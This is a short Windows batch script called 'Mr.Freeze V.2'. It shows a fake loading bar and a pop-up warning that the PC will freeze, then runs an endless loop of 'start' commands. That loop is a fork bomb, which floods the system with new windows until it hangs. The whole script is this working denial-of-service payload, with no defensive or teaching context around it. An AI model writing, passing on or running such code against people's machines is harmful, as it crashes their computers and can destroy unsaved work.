@echo off

title Mr.Freeze V.2
color 3

set/a loadnum=0

:Loading
set load=%load%лл
cls
echo.
type header.txt
echo  ------------------------------------------------
echo  Loading:%load%
echo  ------------------------------------------------
ping localhost -n 1 >nul

set/a loadnum=%loadnum% +1
if %loadnum%==20 goto Done

goto Loading
:Done
echo.

echo set WshShell = WScript.CreateObject("WScript.Shell") > %tmp%\tmp.vbs
echo WScript.Quit (WshShell.Popup( "In 5 seconds your PC is going to freeze." ,5 ,"Mr.Freeze V.2", 16)) >> %tmp%\tmp.vbs
cscript /nologo %tmp%\tmp.vbs
if %errorlevel%==1 (
  echo Initializing...
) else (
  echo Initializing...
)
del %tmp%\tmp.vbs

sleep 2

:Bomb
start
goto Bomb